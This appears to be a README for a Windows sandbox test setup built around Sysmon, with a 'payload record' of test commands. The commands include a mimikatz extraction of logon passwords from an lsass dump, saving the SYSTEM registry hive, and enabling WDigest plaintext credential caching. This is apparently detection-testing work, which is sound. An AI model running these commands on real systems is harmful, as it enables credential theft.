# sandbox_test

- sand.py: code
- Sysmon64.exe: sysmon
- sysmonconfig.xml: config

#### note: put Sysmon64.exe and sysmonconfig.xml in C:\Users\\{Username}\Documents

##### payload record:
##### SCHTASKS (powershell only)
$time = [DateTime]::Now.AddMinutes(30)
$hourMinute = $time.ToString("HH:mm")
SCHTASKS /Create /SC ONCE /TN "Open Notepad" /TR "notepad.exe" /ST $hourMinute


mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit

copy %USERPROFILE%\\Desktop\\SandboxFiles\\sysmonconfig.xml .

whoami

xcopy %USERPROFILE%\\Desktop\\SandboxFiles .  /H  /Y

reg save HKLM\SYSTEM c:\system.save

reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
